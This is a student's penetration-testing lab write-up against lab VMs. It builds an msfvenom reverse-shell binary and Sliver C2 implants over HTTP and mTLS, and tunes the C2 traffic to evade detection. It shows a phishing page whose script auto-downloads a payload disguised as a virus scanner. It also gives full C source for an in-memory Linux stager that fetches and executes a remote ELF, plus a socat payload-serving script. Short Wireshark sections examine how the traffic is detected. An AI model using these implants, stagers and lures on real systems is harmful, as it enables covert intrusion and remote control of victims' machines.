# A) Venom
**Objective**
- Create malware using **Msfvenom** that calls "home" and establishes a **reverse shell**
- Accept the connection using Metasploits `multi/handler`

## What's msfvenom?
A payload generator and encoder
- Source: msfvenom man pages

## Target
`metasploitable3` is todays victim, fire it up:
```bash
$ vagrant up ub1404
```
More on ms3 [here](<https://github.com/rapid7/metasploitable3>) and how I [set it up](<https://github.com/Ali-Mikael/Pen-testing/blob/main/h3-EternalExploit.md#setting-up>) using libvirt as the provider.[1][2]

## Reverse 🐚
Fire up Kali and straight to man pages we go:
```bash
$ man msfvenom
```

I got the basic idea on how to use the tool but didn't know which `output format` to use, so we do:
```bash
$ msfvenom --list formats
```

Then craft the payload:
```bash
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.130.233 LPORT=4040 -f elf -o legitBin

# Make the payload executable:
$ chmod +x legitBin
```
**Flags explained**
- `-p`: Payload to use: `linux/x86/shell_reverse_tcp`
- `-f`: Output format: `elf`
  - `Executable & Linkable Format` is a binary format which can be executed on the system 
- `-o`: Where to store output: `legitBin`


> [!TIP]
> Use tab completion to your advantage. For example, after specifying the platform and architecture `linux/x86/`, press tab a few times to get all the available options for that specific `OS/Arch`!
>
> Note: I'm using using the `Z Shell` A.K.A `zsh` here! This might work differently in different shells.


In `msfconsole` we use the `multi/handler` module to set up a listener:
```console
$ sudo msfconsole
msf > use exploit/multi/handler
    > options
    > set LHOST 192.168.130.233
    > set LPORT 4040
    > set payload linux/x86/shell_reverse_tcp
    > run
[*] Started reverse TCP handler on 192.168.130.233:4040 
```
**Explained**
- `LHOST`: Same IP as in the payload (attackers IP)
- `LPORT`: Port to listen to, same as in the payload
- `payload`: I feel like this one speaks for itself 

Now that the listener is running we can execute the payload on the victims machine to get a reverse shell.

Get the ip of the victim:
```bash
$ sudo nmap -sn -T4 192.168.130.0/24

Nmap scan report for metasploitable3-ub1404 (192.168.130.202)
Host is up
```


**Drop the bomb:**
```bash
$ rsync -av legitBin vagrant@192.168.130.202:/home/vagrant/
```
We're sending the payload via SSH using `rsync`, but let's use our imagination here and say we did a successful phishing campaign! ;)
The victim clicked a link which downloaded & executed the binary:

<img width="876" height="169" alt="2026-04-30-16:27:06" src="https://github.com/user-attachments/assets/a0d66341-2b3f-481e-ac20-f9e65f27a20c" />

The listener catches the connection and the attacker effectively now has a reverse shell:
<img width="1793" height="769" alt="2026-04-30-16:26:39" src="https://github.com/user-attachments/assets/e94a33e8-4162-482c-bbe6-40db9c8a2847" />






--------------






# B) Where's Venom
**Objective**
- Inspect and analyze the reverse shell connection using a packet sniffer such as Wireshark
  - What do you observe?
  - What makes the connection detectable?
  - How would one obscure the detection?
 

## Eavesdropping
We start a packet capture on interface `eth1` (on the attack machine) using Wireshark. We can inspect the data being exchanged more closely by `right clicking` one of the packets, then --> `Follow` and lastly --> `TCP Stream`

`Red` is the attacker and `blue` is the response from the victim, talk about read team / blue team lol:

<img width="1394" height="846" alt="2026-04-30-16:56:30" src="https://github.com/user-attachments/assets/42c6299b-4d5b-49e3-9de1-25c858181a74" />


This makes it obvious that somebody is connected to the machine and executing shell commands. One could **obscure** it by encrypting the traffic for example!





------------





# C) Hello Sliver
**Objective**
- Show an example of an HTTP-connection using Sliver


<img width="948" height="224" alt="2026-05-01-19:29:33" src="https://github.com/user-attachments/assets/7f013b43-060f-43b5-b046-a6a82179ed2b" />

> "A powerful command and control framework designed to provide advanced capabilities for covertly managing and controlling remote systems" [3]

## Install on kali:
```bash
$ sudo apt update && sudo apt install sliver -y
# OR
$ curl https://sliver.sh/install | sudo bash
```

Type `sliver-server` to launch the interactive console:

<img width="1770" height="784" alt="2026-05-03-20:24:42" src="https://github.com/user-attachments/assets/21fc7c5e-9e26-48bd-9521-86cdab10c8d7" />




> [!TIP]
> Type `help` for a listing of all available commands !


## Modes
Sliver `implants` operate in `beacon` or `session` mode. **Beacon mode** essentially means that the implant on the victim/host will periodically retreive tasks from the server, execute them, and return with the results, this is an asynchronous mode of communication.

In **session mode** the implant creates a real-time session either by a **persistent connection** or **long polling**. Long polling basically means the **client** will check in with the **server** and return only after there's something to return with, compared to short polling where the client periodically probes the target.

**Q:** You talked about implants, what are they?

**A:** An `implant` is the actual code/payload that runs on the target system we want remote access to!

In order to establish a connection, we first need to **generate the implant**. We don't know how to do that yet, so in the console:
```console
sliver > generate --help
```
This gives us a pretty comprehensive list of all the options.

Having perused the help page we come up with the following:
```console
sliver > generate -b 192.168.130.233 -o linux

 ⠙  Compiling, please wait ...
```
**Flags**
- `-b`: http(s) connection string
- `-o`: Operating system

```console
[*] Build completed in 2m44s
[*] Implant saved to /home/steve/box/sliver/PAINFUL_WHORL
```
List all implants like so:

<img width="1904" height="345" alt="2026-04-30-19:36:09" src="https://github.com/user-attachments/assets/65c5efb1-8274-47fe-9f5b-41e60ae3ecca" />


Start a `HTTP` listener:
```console
sliver > http

[*] Starting HTTP :80 listener ...
[*] Successfully started job #2
```

### Active session?

<img width="533" height="129" alt="2026-04-30-19:39:41" src="https://github.com/user-attachments/assets/e1ce07f8-5fbf-40c9-a21f-78c1b8332220" />

Not yet. Let's change that! 

If you paid attention you know it saved the **payload** to a directory I created earlier for sliver. We go to the directory and send the payload away:
```bash
$ rsync -av PAINFUL_WHORL vagrant@192.168.130.202:/home/vagrant
```
Play along that we did some magnificent phishing campaign again and got the victim to download the malware! 😆

## Phishing attack fantasy
> A very simple & unsophisticated example

Create a `html` subdirectory and copy the implant there under a new name:
```bash
$ mkdir html
$ cp PAINFUL_WHORL html/virus_scanner
$ ls html
index.html  virus_scanner
```
The `index.html` file:
```html
<!DOCTYPE html>
<html> 
	<head> 
		<title>Secure Download</title>
	</head>
	<body> 
		<h1>Welcome to this completely legit website for downloading your favourite system utilities!</h1>
		<a href="./virus_scanner" download>Download an awesome virus scanner here!</a>
	</body>
</html
```
I took an example from [here](<https://www.geeksforgeeks.org/html/how-to-link-pages-in-html/>) on how to create the wep page! [4]

We can then serve the web page using python for example (quick and easy):
```shell
$ python3 -m http.server 8080 --directory ./html
```
Now we lure the victim to visit our webpage and click the link:

<img width="1920" height="502" alt="2026-05-02-12:41:45" src="https://github.com/user-attachments/assets/f4ac8c51-d63d-4864-bd52-9bd453160be3" />

<img width="1778" height="321" alt="2026-05-02-13:08:24" src="https://github.com/user-attachments/assets/a5314d3c-2c9e-4239-95e9-e9ab57d99697" />


The victim starts the "virus scanner" and we type `sessions` again in the console and notice the active connection:

<img width="1858" height="197" alt="2026-04-30-19:44:33" src="https://github.com/user-attachments/assets/dd1d514b-2f1e-485a-9e2f-8134147f3e90" />


To `use` the session we:

<img width="1364" height="233" alt="2026-04-30-19:46:39" src="https://github.com/user-attachments/assets/6f3b0f6c-3201-49d6-9805-ce0cf47a9da6" />

While connected you can always type `help` to get a list of all available commands in the session.

Example of a command we can use: list information about host interfaces:
<img width="1714" height="886" alt="2026-04-30-19:49:03" src="https://github.com/user-attachments/assets/9947b35c-d717-4cab-8c0f-185e427e5089" />

And there you have it, a simple `HTTP` connection. Next we'll dissect it.

**Help received**
-  [Sliver documentation](<https://sliver.sh/docs>)




---------------




# D) Sniff sliver
**Objective**
- Inspect the Sliver http-connection using a packet sniffer
  - What do you observe?
  - What makes the connection detectable?

## Eavesdropping
Fire up Wireshark and start capturing.

The first suspicious thing we notice is the connection using `HTTP` which is inherently insecure, plus it uses an old version of said protocol: `HTTP/1.1`.

Let's take a look at an example:

<img width="1868" height="392" alt="2026-04-30-19:54:24" src="https://github.com/user-attachments/assets/d8ec6b86-a685-42ef-91af-23e6676a3594" />

The `URI` is looking a bit suspect as well.

If we `follow tcp stream` again it looks even more questionable:

<img width="1373" height="685" alt="2026-04-30-20:05:58" src="https://github.com/user-attachments/assets/1fbdb81f-88e2-42eb-ae2d-b6dc321658a2" />

We notice a bunch of `GET` requests and the server responding with `204 No Content`, which is used to implement "_save and continue editing_" functionality in applications.

**Q:** What makes it suspect?

**A:** The fact that the `204` response is meant for `PUT` and `DELETE` requests, NOT `GET`. At least that's the understanding I got from the Mozilla developer docs.[6]

I found one exchange with actual data:

<img width="1376" height="505" alt="2026-04-30-20:02:20" src="https://github.com/user-attachments/assets/b070c02d-9feb-4e71-81c5-d8bb2bc9131b" />

This is suspicious to me as normal plain text http request would usually have some amount of human-redable strings in the data.. This seems like somebody is manually obfuscating the data being sent.








-------------







# E) Hiding in plain sight
**Objective**
- One can modify the connection details using Sliver
- Try and show an example
- Showcase that it works

## Totally legit web server!
We want the web traffic to look a bit more legit, so we generate a `c2profile` using a **wordlist of URLs**.

If you have `seclists` installed you can use: `/usr/share/seclists/Discovery/Web-Content/URLs/urls-wordpress-x.x.x.txt`, the version i'm using is `3.3.1`, depending on when you're reading this the version might differ for you.

Now that we have a wordlist to use, let's create a profile:
```console
sliver > c2profiles generate -f /usr/share/seclists/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt -n wordpress -i

C2 profile generated and saved as wordpress
```
**Explained**
- `-f` - Path to file containing URL list
- `-n` - HTTP C2 Profile name
- `-i` - Import generated profile after creation

<img width="766" height="242" alt="2026-05-01-18:59:41" src="https://github.com/user-attachments/assets/e7561949-ae6c-40bb-8630-567b24d0c4cd" />


We then **generate a new implant** using the **profile**:
```console
sliver > generate -b 192.168.130.233 -o linux -C wordpress

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
 ⠙  Compiling, please wait ...

[*] Build completed in 2m15s
[*] Implant saved to /home/steve/box/sliver/POWERFUL_COCOA
```
You already know the other flags, now we're introducing:
- `-C`: c2 profile

We rename the file and send it away:
```bash
$ mv POWERFUL_COCOA background_agent
$ rsync -av background_agent vagrant@192.168.130.202:/home/vagrant
```

Back in the console we issue the `jobs` command to check if the listener is still active:
```console
sliver > jobs

 ID   Name   Protocol   Port   Domains 
==== ====== ========== ====== =========
 1    http   tcp        80             
```
**It is! Time to execute the payload on the victim.**

<img width="1516" height="517" alt="2026-05-01-19:15:50" src="https://github.com/user-attachments/assets/36985793-bd21-4d7c-ba66-c31fa157b1d2" />

It looks a bit more legit now. Take a look at the `GET URL`:

<img width="1374" height="592" alt="2026-05-01-19:20:17" src="https://github.com/user-attachments/assets/01b40b71-5b8f-4769-91f8-5205589cecd3" />

**Akismet:**
- <img width="953" height="528" alt="2026-05-01-19:21:17" src="https://github.com/user-attachments/assets/0a14a603-af3f-4624-a598-20b76d006b17" />

Another one:

<img width="1377" height="209" alt="2026-05-01-19:22:14" src="https://github.com/user-attachments/assets/4192aa22-9743-455c-8aea-35e183f1d02d" />


### Hide
Let's go one step further and obfuscate the connection even more by using `mTLS` A.K.A Mutual TLS. [7]


```console
sliver > generate -m 192.168.130.233 -o linux -C wordpress

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
 ⠙  Compiling, please wait ...

[*] Build completed in 2m34s
[*] Implant saved to /home/steve/box/sliver/TROPICAL_DRESS

```
**New flag**
- `-m`: The mtls connection string

This time we don't start an http listener, but rather one that can handle the **mTLS connection** like so:
```console
sliver > mtls
[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > jobs

 ID   Name   Protocol   Port   Domains 
==== ====== ========== ====== =========
 1    mtls   tcp        8888
```
**The victim executes the binary and we have a reverse shell:**

```console
[*] Session 68b2f9b2 TROPICAL_DRESS - 192.168.130.202:35978

sliver > use 68b2f9b2 

[*] Active session TROPICAL_DRESS (68b2f9b2-d3d5-44a3-8f84-40e6672d7202)
```
<img width="778" height="128" alt="2026-05-01-19:55:50" src="https://github.com/user-attachments/assets/f65e3585-bf7c-4b44-ba42-4af05630caab" />


### What's goin on?
Well the traffic is encrypted, so it's much harder to say:

<img width="1521" height="273" alt="2026-05-01-19:50:55" src="https://github.com/user-attachments/assets/1a1636f6-2ac5-4568-9eff-bb785d87639c" />

<img width="1448" height="209" alt="2026-05-01-19:51:15" src="https://github.com/user-attachments/assets/ecde7040-780a-437c-a3ad-ef6bb9a81436" />

### Follow (encrypted) TCP Stream
<img width="1389" height="840" alt="2026-05-01-19:52:20" src="https://github.com/user-attachments/assets/bcd74389-d7d0-4699-80b5-5bd7a66773e9" />


**Help received**
- Sliver Docs [5]






----------------







# F) Feature Rich
**Objective**
- Sliver is good for a lot
- Show examples of some of it's features

## Multitalent
Well, for example, in the session we can easily loot some environment variables like so:

<img width="1722" height="734" alt="2026-05-01-20:05:34" src="https://github.com/user-attachments/assets/a9ee3684-1a46-4882-8448-839389264b95" />


Or list all mounted file systems using the `mount` command:

<img width="1912" height="590" alt="2026-05-02-12:24:49" src="https://github.com/user-attachments/assets/45c525f2-f8de-4f12-b480-2d8af556efc4" />


## Beacons and Stagers
The implants generated by Sliver can get pretty hefty in size:

<img width="561" height="114" alt="2026-05-02-19:48:37" src="https://github.com/user-attachments/assets/7fe36608-8fe5-4128-9caa-959f675b6585" />

One way to reduce our footprint payload vise as well as detection vise is to use a stager! We're also going to switch over to beacon mode in order to limit our exposure on the network, not just the host.

**Q:** _What's a stager?_

**A:** _Simply put: A small executable that establishes a connection with a C2 server and downloads the actual payload. Benefits include: It's small in size, easy to obfuscate, and more likely to evade detection. It can load multiple different payloads, so it's very dynamic in nature. Want to switch payloads on the go? The stager got your back! It can also be used to decrypt incoming (encrypted) payloads and run them completely in memory, meaning it doesn't save the payload to disk before executing. Read more about it [here](<https://encyclopedia.kaspersky.com/glossary/stager/>) and [here](<https://blog.retracelabs.io/posts/stager101/stagers-101/>)._


**Without further ado, let's get to it!** 

We start off by creating a reusable **profile**:
```console
sliver > profiles new beacon -m 192.168.130.233 -o linux -f shellcode --shellcode-compress -e linuxServer

[*] Saved new implant profile (beacon) linuxServer
```

You already know the flags, we're only changing format to `shellcode` and, adding the `--evasion` flag to help evade detection, and as the last argument give the profile a name.

> [!NOTE]
> For Linux/MacOS **only** the `--shellcode-compress` extra option is available when using `--format shellcode`!

_Why do we do this you might ask? So that we can easily create implants etc. based on the profile, without having to retype all the details every single time. Efficiency my friend! Also less room for human error: forgeting or messing up ip addresses, formats, ports, targets etc.. This way they'll stay consistent, especially in large scale operations. This is a C2 server after all!_

List the new profile:
```console
sliver > profiles 

 Profile Name   Implant Type   Platform      Command & Control                 Debug   Format      Obfuscation   C2 Profile 
============== ============== ============= ================================= ======= =========== ============= ============
 linuxServer    beacon         linux/amd64   [1] mtls://192.168.130.233:8888   false   SHELLCODE   enabled       default    
```

Now that we have the profile set up, we can use it to create a `stage-listener` like so:
```console
sliver > stage-listener -u tcp://192.168.130.233:80 -p linuxServer

 ⠙  Compiling, please wait ...
[*] Job 1 (tcp) started
```
We just need to specify `URL` and `profile` to use.


The `stage-listener` is used to **serve the remaining shell code**, but we still need the `mtls-listener` for the **main communication channel**:
```console
sliver > mtls

[*] Starting mTLS listener ...
[*] Successfully started job #2
```
## Missing dependency
<img width="416" height="43" alt="2026-05-03-00:42:55" src="https://github.com/user-attachments/assets/65d40def-5eb1-4372-84d9-1915d4536850" />
(Picture from Sliver's own documentation)

At this point I got stuck, because all the material I could find kept using the command:
```console
sliver > generate stager --lhost xxx -lport xxxx ....
```
but when it finally came time to use it, it didn't even exist.. 

## Problem solving
I had downloaded Sliver from the Debian/Kali repositories, so I thought it might be the reason for my troubles and deleted the package in question and reinstalled with:
```bash
$ curl https://sliver.sh/install | sudo bash
```
But to no avail...

So I did some digging and stumbled upon some old [source code](<https://github.com/BishopFox/sliver/blob/93e772f5bf81c59ca25033e1d6d40138f615b4b8/client/command/generate/generate-stager.go#L18>) for that specific feature at: `sliver/client/command/generate/generate-stager.go` which had the latest `commit` 4 years ago..

And from the [new source code](<https://github.com/BishopFox/sliver/tree/master/client/command/generate>) at `sliver/client/command/generate/` the same file is **gone**.. 

BUT, I did however manage to find 2 new files in the source
- `profiles-stage.go`
- and
- `implants-stage.go`

So we'll try it out with these I guess.


## Problem #2
Did some more digging & found out that `Sliver` doesn't really support staging for Linux (no wonder all the material is just windows windows windows), but I did some digging and found a thread on this issue [here](<https://github.com/BishopFox/sliver/issues/1734>) (issue number #1734, still open today 02.05.26). Some guy in the thread had solved this, so I copied his [TCP stager](<https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>) and changed `HOST` to `192.168.130.233` and `PORT` to `8080` and compiled the stager:
```bash
$ gcc -static linuxStager.c -o linuxStager

# Bombs away
$ rsync -av linuxStager vagrant@192.168.130.202:/home/vagrant
```

## We go again
I created a new profile with format: `exe` 
```console
sliver > profiles new beacon -m 192.168.130.233 -o linux -f exe -e linuxServerExe
```
(The `shellcode` payload does not work with our stager. I tried it..)

Generate the implant from the  profile:
```console
sliver > profiles generate linuxServerExe -s /home/steve/box/sliver/payloads/linuxServerExe

[*] Generating new linux/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Build completed in 1m51s
[*] Implant saved to /home/steve/box/sliver/payloads/linuxServerExe

sliver > 
sliver > implants

 Name                Implant Type   Template   OS/Arch           Format   Command & Control                 Debug   C2 Config   ID    Stage 
=================== ============== ========== ============= ============ ================================= ======= =========== ===== =======
 DETERMINED_SHOWER   beacon         sliver     linux/amd64   EXECUTABLE   [1] mtls://192.168.130.233:8888   false   default     211   false 
```

Spawn the listeners and stage the implant:
```console
sliver > stage-listener --profile linuxServerExe -u tcp://192.168.130.233:8080 
[*] Job 3 (tcp) started

sliver >
sliver > mtls 
[*] Starting mTLS listener ...
[*] Successfully started job #4


sliver > implants stage

┃ Select sessions and beacons to expose:                                                                                      
┃ > [•] DETERMINED_SHOWER                                                                                                     
┃   [ ] TREMENDOUS_BATHTUB                                                                                                    
```


I executed the `linuxStager` on the victim and it exited immediately. I guess even the listener is not working properly. Which makes sense based on: "Sliver doesn't support staging for Linux". So why would the staging-listener work then.. 😂

I had already spent hours upon hours doing this, and my goal was to just get this thing working. So we kill the misbehaving listener and spin up our own!
```console
sliver > jobs -k 3 
```

Create a script which will serve our payload:
```bash
while true; do
	( 
	printf "%08x" "$(stat --format '%s' linuxServerExe)" | xxd -p -r 
	cat linuxServerExe	
	) | socat - TCP-LISTEN:8080,reuseaddr
done
```
**Explained**
- `while true`: Ensure the listener _restarts automatically after each connection_
- `(`: Start a `subshell` so we can _pipe multiple commands into one output stream_
- `stat`: Get the _file size in bytes_
  - `printf`: Format as 8 character hex value (`%08x`)
  - `xxd -p -r`: Convert the value into raw bytes for transmission
  - All in all: Creates a 4 byte binary header that contains the size of the payload
- `cat`: Output the raw payload bytes after the header
- `)` End the `subshell`
- `socat` serve the staged payload over `TCP` via port `8080` and rebind the port after disconnects
- Source: Man pages, experience and logic. For the `printf / (stat)` statement I had to ask chatGPT "what does this do" 😂

> [!NOTE]
> I got idea from the guy who wrote the TCP stager. His solution was two commands:
> ```bash
> $ printf "%08x" "$(stat --format '%s' DISABLED_ABROAD)" | xxd -p -r > DISABLED_ABROAD_staged
> $ cat DISABLED_ABROAD_staged | nc -lvp 80 -s 192.168.45.199
> ```

Start the listener:
```bash
┌──(steve㉿flyingcarpet)-[~/box/sliver/html]
└─$ ./stage-listener.sh
```

Execute the stager on the victim (after a succesful phishing campaign)
```bash
vagrant@metasploitable3-ub1404:~$ ./linuxStager 
vagrant@metasploitable3-ub1404:~$ 
vagrant@metasploitable3-ub1404:~$ echo $?
0
```
...but it exits immediately. Even though the exit code was 0, something is off..


## Troubleshooting
The listener is available:

<img width="985" height="56" alt="2026-05-03-14:24:59" src="https://github.com/user-attachments/assets/766aed58-9b41-449a-9d8a-1435826956c3" />

Okay so maybe the `stager` is broken? After all it's random code I found on github 😂

So I asked chatGPT what modifications to make and it basically told me to remove a few sections. I refrained from deleting and rather commented them out and added a few debugging statements:
```C
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <unistd.h>

// Change from '/usr/bin/bash' to --> 'stage'
#define ELF_NAME "stage"
#define HOST "192.168.130.233"
#define PORT 8080

int main(void) {
    /*pid_t pid = fork();
    if (pid < 0) { return 1; }
    else if (pid > 0) { return 0; }

    if (setsid() == -1) { return 1; }

    pid = fork();
    if (pid < 0) { return 1; }
    else if (pid > 0) { return 0; }

    if (chdir("/") < 0) { return 1; }*/

    //close(STDIN_FILENO);
    //close(STDOUT_FILENO);
    //close(STDERR_FILENO);

    /* int fd = open("/dev/null", O_CLOEXEC | O_RDWR);
    if (fd == -1) { return 1; }

    dup2(fd, STDIN_FILENO);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    if (fd > 2) { close(fd); } */

    int return_value = 1;

    int sd = socket(AF_INET, SOCK_CLOEXEC | SOCK_STREAM, 0);
    if (sd == -1) { goto ERROR; }

    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(PORT);

    if (inet_pton(AF_INET, HOST, &sa.sin_addr) < 1) { goto ERROR_SD; }
    if (connect(sd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
        goto ERROR_SD;
    }
    // Add debug
    printf("connected\n");

    uint32_t elf_size = 0;
    if (recv(sd, &elf_size, sizeof(elf_size), 0) != sizeof(elf_size)) {
        goto ERROR_SD;
    }
    // Add debug
    printf("received payload\n");

    elf_size = ntohl(elf_size);

    uint8_t *elf_data = malloc(elf_size);
    if (!elf_data) { goto ERROR_SD; }

    ssize_t bytes_partial = 0;
    ssize_t bytes_total = 0;
    while (bytes_total < elf_size) {
        bytes_partial = recv(
            sd, elf_data + bytes_total, elf_size - bytes_total, 0);
        if (bytes_partial < 1) { goto ERROR_DATA; }

        bytes_total += bytes_partial;
    }

    int md = memfd_create(ELF_NAME, MFD_CLOEXEC);
    if (md == -1) { goto ERROR_DATA; }

    bytes_total = 0;
    while (bytes_total < elf_size) {
        bytes_partial = write(
            md, elf_data + bytes_total, elf_size - bytes_total);
        if (bytes_partial < 1) { goto ERROR_MEMFD; }

        bytes_total += bytes_partial;
    }

    char *argv[] = {ELF_NAME, NULL};
    char *envp[] = {NULL};

    // Add debug
    printf("executing memfd\n");

    if (fexecve(md, argv, envp) == -1) {
		// Add debug
        perror("fexecve");
		goto ERROR_MEMFD;
    }

    return_value = 0;

ERROR_MEMFD:
    close(md);

ERROR_DATA:
    free(elf_data);

ERROR_SD:
    close(sd);

ERROR:
    return return_value;
}
```

Recompile and fire away:
```bash
$ gcc -static linuxStager.c -o linuxStager
$ rsync -av linuxStager vagrant@192.168.130.202:/home/vagrant
```

This time we get a little further but execution stops and exits != 0
```
vagrant@metasploitable3-ub1404:~$ ./linuxStager 
connected
received payload
vagrant@metasploitable3-ub1404:~$ echo $?
1
```
So I decided to try it locally:

<img width="1049" height="242" alt="2026-05-03-22:39:47" src="https://github.com/user-attachments/assets/e12e3b18-9041-4d7b-b356-adb40f0ff1fa" />


And wouldn't you know the **beacon is activated**!


<img width="1901" height="166" alt="2026-05-03-22:41:10" src="https://github.com/user-attachments/assets/1fd21c65-0478-4a76-a1cf-b052b24dde3c" />



## Troubleshooting part xx
I was still destined to execute the stager succesfully on the victims's machine. I thought maybe the `static linking` is the problem here? So I compiled it dynamically and sent it away.


_Quick explanation so that you get the concept: By **statically linking** the executable, all required libraries (dependencies) are built into the binary itself, rather than being loaded from the host system at runtime. This increases the binary size, but also makes it more portable!_

Test the connection first:

<img width="1622" height="365" alt="2026-05-03-23:11:55" src="https://github.com/user-attachments/assets/863670c4-3674-4ef8-97fa-f07fdaec0585" />


And then execute:
```bash
vagrant@metasploitable3-ub1404:~$ ./linuxStager 
./linuxStager: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.27' not found (required by ./linuxStager)
./linuxStager: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./linuxStager)
```

I'm guessing the problem is that our target system is too old (ubuntu 14.04) to be executing a payload compiled on a rolling distro like Kali.. 😂

So I set out on a hunt and found all available `GCC` [versions for Ubuntu](<https://documentation.ubuntu.com/ubuntu-for-developers/reference/availability/gcc/>). `Ubuntu 14.04` (Trusty Tahr) uses versions: `4.4`, `4.6`, `4.7`, `4.8`, last one being the default.


I figured the least painful way to go about this this is to mimick the target environment and compile there. To achieve said task with the parameters laid out, I think containers are the solution here.

### Workflow
```bash
$ docker pull ubuntu:trusty # <-- Pull the image that matches our target
$ docker images

REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
ubuntu       trusty    13b66b487594   5 years ago   197MB

$ sudo docker run -it 13b66b

root@5803c1e4b917:~# apt update && apt install gcc musl-tools -y

## On the host machine 
┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
└─$ docker ps       
CONTAINER ID        NAMES
5803c1e4b917        reverent_northcutt

## Copy source file to container                                                                                                            
┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
└─$ docker cp ./linuxStager.c reverent_northcutt:/root/

## Back in the container:

root@5803c1e4b917:~# musl-gcc -static linuxStager.c -o linuxStager
linuxStager.c: In function 'main':
linuxStager.c:80:37: error: 'MFD_CLOEXEC' undeclared (first use in this function)
     int md = memfd_create(ELF_NAME, MFD_CLOEXEC);
                                     ^
linuxStager.c:80:37: note: each undeclared identifier is reported only once for each function it appears in
```
It's late and the task has to be given in so don't want to spend too much time debugging, just pasted the problem to chatGPT and asked it to fix it.
```bash
# It said change -->
int md = memfd_create(ELF_NAME, MFD_CLOEXEC);
# TO -->
int md = memfd_create(ELF_NAME, 0);

# Also noted that
Older environments may ALSO lack the libc wrapper for:
memfd_create()
If that happens next, use the raw syscall instead.
#include <sys/syscall.h>
int md = syscall(SYS_memfd_create, ELF_NAME, 0);

# I confirmed the latter issue by retrying compilation and then I got the exact error it warned about,
# so we make the necessary modifications and recompile

# Got another issue which we fixed by changing
int md = syscall(SYS_memfd_create, ELF_NAME, 0);
# TO -->
int md = syscall(319, ELF_NAME, 0);

root@5803c1e4b917:~# musl-gcc -static linuxStager.c -o linuxStager
```
**Q:** Why did we use `musl` for compiling ?

**A:** During my soul-searching online I stumbled upon [this](<https://lindevs.com/install-musl-gcc-on-ubuntu>) blog post talking about musl for building statically linked, lightweight and portable binaries. That sounded good enough for me so I thought why not give it a go 🤷‍♂️

A professional description:

_"musl-gcc is a GCC wrapper that compiles programs against musl libc instead of glibc. Musl is a lightweight C standard library designed for static linking and embedded systems. Creates smaller, portable binaries suitable for containers and minimal environments." - [Source](<https://linuxcommandlibrary.com/man/musl-gcc>)_

Back on Kali we copy over the `reborn stager` from the container, drop the sneaky bomb on the victim and start the listener.
```bash
┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
└─$ docker cp reverent_northcutt:/root/linuxStager ./linuxStagerOld    
                                                       
┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
└─$ rsync -av linuxStagerOld vagrant@192.168.130.202:/home/vagrant/

┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
└─$ ./stage-listener.sh
```
<img width="1180" height="211" alt="2026-05-04-00:18:28" src="https://github.com/user-attachments/assets/03fd6068-bcff-4c77-a83a-69453745344b" />


## TADAAA

I compiled again using `gcc` this time without `-static` and tried again:

<img width="705" height="187" alt="2026-05-04-00:21:36" src="https://github.com/user-attachments/assets/0443acb7-149c-4576-81bb-7c19785b10ef" />

## Sike! Not yet...
Before moving forward I decided to **drop the full payload** on the victim to make sure that running the actual payload itself is not the issue here:

<img width="797" height="190" alt="2026-05-04-00:25:46" src="https://github.com/user-attachments/assets/87e8e960-c950-4cf3-a0d2-2881c42f2a62" />

And wouldn't you know our `mtls-listener` caught the beacon:

<img width="1912" height="534" alt="2026-05-04-00:26:30" src="https://github.com/user-attachments/assets/684287ee-4b3d-49d5-80c4-7a14fb640b83" />


So the problem is with the old ass ubuntu system not being able to run our stager. I'll come back to this another day because my time right now is running out.

I shut down the ol box and spun up another VM. I thought it'd be funny to use the _Cisco NetAcad cyber security lab VM_ so that's what I did. I also fired up the web server on the attacker:
```bash
# Compile
┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
└─$ musl-gcc -static linuxStager.c -o linuxStager   

# Copy the stager to html/
┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
└─$ cp linuxStager ../html

# Edit the index file
┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
└─$ cd ../html && vim index.html

# Rename the stager
┌──(steve㉿flyingcarpet)-[~/box/sliver/html]
└─$ mv linuxStager virus_scanner                 

# Fire up the web server
┌──(steve㉿flyingcarpet)-[~/box/sliver/html]
└─$ python3 -m http.server 4343 --directory ./
Serving HTTP on 0.0.0.0 port 4343 (http://0.0.0.0:4343/) ...
```
Because of the script I added to our html page:
```html
<script>
window.onload = function(){
	var a = document.createElement("a");
	a.href = "./virus_scanner";
	a.download = "virus_scanner";
	a.click();
};
</script>
```
As soon as the victim browses to our site the file is downloaded, don't even have to click anything ....themselves, the script does it for us!

<img width="1926" height="621" alt="2026-05-04-01:20:08" src="https://github.com/user-attachments/assets/554a43ac-82e3-4ffe-b98f-805af5f73aa0" />

<img width="721" height="113" alt="2026-05-04-01:21:01" src="https://github.com/user-attachments/assets/6ae55855-9cf9-4f4a-9b3d-c39774a1e330" />



**The moment of truth:**
```bash
[analyst@secOps Downloads]$ chmod +x virus_scanner 
[analyst@secOps Downloads]$ 
[analyst@secOps Downloads]$ ./virus_scanner 
[analyst@secOps Downloads]$ echo $?
1
```
Nahh, not yet..

I pondered and tinkered until I realized the main issue right now is the fact that we switched networks after shutting down vagrant.. 😂

I figured it out when executing the stager locally and it didn't work anymore. Before it was working locally at least. So I configured the whole shabang again with new connection details.

## Here we go again part xx
```console
sliver > profiles new beacon -m 192.168.120.233 -o linux -f elf -e linuxServerExe2p0

sliver > profiles generate linuxServerExe2p0 -s ./linuxServerExe2p0

[*] Generating new linux/amd64 beacon implant binary (1m0s)
